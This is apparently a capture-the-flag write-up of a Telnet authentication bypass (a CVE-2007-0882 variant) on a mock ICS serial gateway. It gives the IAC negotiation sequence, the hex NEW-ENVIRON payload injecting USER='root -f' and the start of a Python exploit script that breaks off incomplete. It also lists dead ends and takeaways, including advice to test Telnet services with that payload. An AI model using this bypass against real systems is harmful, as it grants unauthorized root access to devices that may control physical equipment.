## Overview

A single TCP port speaks Telnet. The lore frames it as a tap on an ICS serial
line — a serial-to-TCP gateway bridging Modbus RTU traffic. The Telnet daemon
on the other end runs `/bin/login` as the authentication gate, giving the
impression that you need credentials to proceed.

The path to the flag is a single exploit step:

**Telnet `NEW-ENVIRON` argument injection** — pass `USER="root -f"` during IAC
subnegotiation. The space causes `telnetd` to invoke `/bin/login root -f`,
where `-f` is `login`'s force-login flag, bypassing the password check entirely.

---

## Reconnaissance

Connecting with a raw `nc` gives a Telnet banner — no login prompt appears
until the IAC negotiation completes. The server sends:

```
ff fd 18  DO TTYPE
ff fd 20  DO TERMINAL-SPEED
ff fd 23  DO X-DISPLAY-LOCATION
ff fd 27  DO NEW-ENVIRON
ff fd 24  DO OLD-ENVIRON
```

Option `0x20` (TERMINAL-SPEED) is the standard baud-rate negotiation for
serial-to-TCP gateways (RFC 1079). Option `0x27` (`NEW-ENVIRON`, RFC 1572) is
the one that matters.

---

## Vulnerability

### RFC 1572 NEW-ENVIRON

The Telnet `NEW-ENVIRON` option lets the client send environment variables to
the server via subnegotiation:

```
IAC SB NEW-ENVIRON IS VAR <name> VALUE <value> IAC SE
```

`telnetd` collects these variables and passes them to `/bin/login`. On systems
where `login` is called via `execl` / `execlp` with user-supplied strings (or
via `sh -c`), the `USER` variable value lands in the command line.

### Argument Injection via Space

When `USER` is set to `"root -f"`, `telnetd` constructs a call equivalent to:

```
/bin/login root -f
```

The space causes `-f` to be interpreted as a **separate argument** to `login`,
not part of the username. The `-f` flag (`--skip-auth`) instructs `/bin/login`
to skip password verification and log in the named user directly.

This is a variant of CVE-2007-0882 (Solaris `in.telnetd` NEW-ENVIRON USER
injection), reproduced here on a Linux telnetd.

## Exploit

### IAC Negotiation Flow

The exchange has three rounds:

**R1 — Server offers options** (arrives ~10-12 s after connect):
```
ff fd 18 fd 20 fd 23 fd 27 fd 24
```
Respond with WILL TTYPE / WILL TERMINAL-SPEED / WONT X-DISPLAY / WILL NEW-ENVIRON / WONT OLD-ENVIRON.

**R2 — Server requests subneg** (arrives after R1 response):
The server sends `SB TTYPE SEND` / `SB TERMINAL-SPEED SEND` / `SB NEW-ENVIRON SEND` requests.
Send subneg responses — the key payload is in `NEW-ENVIRON IS`:

```
ff fa 27 00          # IAC SB NEW-ENVIRON IS
  00                 # VAR type
  55 53 45 52        # "USER"
  01                 # VALUE type
  72 6f 6f 74 20 2d 66  # "root -f"  ← the injection
ff f0                # IAC SE
```

**R3 — Server sends standard options** (arrives after subneg):
```
ff fb 03  WILL SGA
ff fd 01  DO ECHO
ff fd 22  DO LINEMODE
ff fd 1f  DO NAWS
ff fb 05  WILL STATUS
ff fd 21  DO (option 0x21)
```

**These R3 responses are required.** Without them the bypass fires, but the
shell's output is suppressed — the session sits silent indefinitely. Respond
with: DO SGA, WILL ECHO, WONT LINEMODE, WILL NAWS + NAWS SB (80×24), DO
STATUS, WONT opt33.

After R3, the server delivers the Ubuntu welcome banner and a root shell prompt.

```python

HOST, PORT = "<ip>", <port>

def recv_all(s, t=5):
    s.settimeout(t); d = b''
    try:
        while True:
            c = s.recv(4096)
            if not c: break
            d += c
    except Exception:
        pass
    return d

s = socket.socket()
s.connect((HOST, PORT))
recv_all(s, 12)   # wait for R1 — server delays ~10-12 s

# R1 response: WILL TTYPE, WILL TERMINAL-SPEED, WONT X-DISPLAY, WILL NEW-ENVIRON, WONT OLD-ENVIRON

## Dead Ends Explored

**Binary mode passthrough (`WILL BINARY` / `DO BINARY`, option 0x00)** — the
idea was that the serial-to-TCP gateway might relay raw Modbus RTU frames in
binary mode. After sending BINARY subneg the session went completely silent for
five minutes. Root cause (discovered later): binary mode was a distraction; the
silence was because R3 options were never responded to, so the bypassed shell
was waiting with no visible prompt.

**OLD-ENVIRON (option 0x24)** — sending the USER injection via OLD-ENVIRON
subneg instead of NEW-ENVIRON produced no bypass. The server only acts on
the NEW-ENVIRON (0x27) value.

**Modbus RTU / TCP frames** — sent read-coil and read-holding-register requests
directly on the Telnet socket. No response from the daemon.

**AT modem commands** — no response.

**Password guessing** — `root/root`, `root/(blank)`, `root/toor`, common PLC
defaults. All returned "Login incorrect."

**Passive listening** — waited several minutes at various negotiation states for
unsolicited Modbus traffic. The gateway sends nothing unprompted.

---

## Takeaways

**Telnet NEW-ENVIRON USER injection is decades old — and still deployed.** The
CVE-2007-0882 family of bugs showed that `telnetd` passing `USER` to `login` via
a shell-style argument string is inherently unsafe. The fix is to invoke `login`
with a proper `execv` array. Any Telnet service that prompts for a username is
worth testing with `USER="root -f"` and `USER="-f root"` before trying passwords.

**Respond to every IAC option the server sends.** A missing or wrong response to
even one option can leave the negotiation in a limbo where the server has
allocated a pty and started a shell but holds back all output, waiting for the
client to finish negotiating. Treat R3 silence as "negotiation incomplete," not
"bypass failed."

**TERMINAL-SPEED 9600,9600 signals a serial bridge.** When a Telnet daemon
requests baud-rate negotiation, the underlying service is almost certainly a
serial device. This narrows the protocol space (Modbus RTU, DNP3, IEC 101) and
indicates you are one TCP-serial adapter away from physical field devices.

**The ICS misdirection was real.** The challenge title, lore, and Modbus option
negotiation were designed to send solvers into industrial-protocol rabbit holes.
The actual vulnerability was in the Telnet layer, not the ICS payload.
